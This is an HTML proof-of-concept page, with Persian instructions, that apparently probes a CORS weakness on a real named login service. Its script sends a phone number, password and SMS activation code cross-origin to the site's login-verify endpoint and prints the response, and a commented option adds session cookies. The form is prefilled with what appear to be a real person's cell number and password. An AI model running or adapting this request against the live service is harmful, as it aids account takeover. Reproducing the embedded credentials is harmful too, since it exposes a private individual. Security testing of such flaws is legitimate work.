<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8">
  <title>CORS PoC</title>
</head>
<body>
<h1>CORS PoC</h1>

<p>تلفن، پسورد و کد پیامک را اینجا وارد کن و روی دکمه بزن.</p>

<label>Cell number:
  <input id="cell" value="09233950961">
</label><br><br>

<label>Password:
  <input id="pass" value="Ali138296">
</label><br><br>

<label>Activation code:
  <input id="code" value="">
</label><br><br>

<button id="btn">Send verify request</button>

<pre id="out"></pre>

<script>
document.getElementById('btn').onclick = function () {
  const data = {
    cellNumber: document.getElementById('cell').value,
    password: document.getElementById('pass').value,
    activationCode: document.getElementById('code').value
  };

  document.getElementById('out').textContent = 'Sending...';

  fetch("https://app.karafariniomid.com/security/token/neo/login/verify", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    // اگر نیاز به کوکی سشن باشد، این را فعال کن:
    // credentials: "include",
    body: JSON.stringify(data)
  })
  .then(r => r.text())
  .then(t => {
    document.getElementById('out').textContent = t;
  })
  .catch(e => {
    document.getElementById('out').textContent = "Error: " + e;
  });
};
</script>
</body>
</html>
